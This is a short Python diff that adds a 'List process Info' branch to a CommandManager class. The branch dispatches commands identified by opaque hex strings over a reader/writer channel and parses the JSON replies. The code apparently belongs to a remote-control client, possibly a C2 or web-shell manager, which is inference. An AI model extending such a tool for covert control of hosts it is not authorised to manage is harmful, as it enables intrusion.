@@ -19,6 +19,9 @@ class CommandManager(object):
             command = gen_xml("root", command=command, type=message.get("type"),web=message.get("web")) 
             self.writer(command.encode())
             return collect(json.loads(self.reader().decode(errors='replace')))
+        if command == "be425fd08e9ea24230bac47493228ada": #List process Info
+            self.writer(gen_xml("root", command=command))
+            return json.loads(self.reader().decode(errors='replace'))
         command = gen_xml("root", command=command)
         self.writer(command.encode())
         return self.reader().decode(errors='replace')
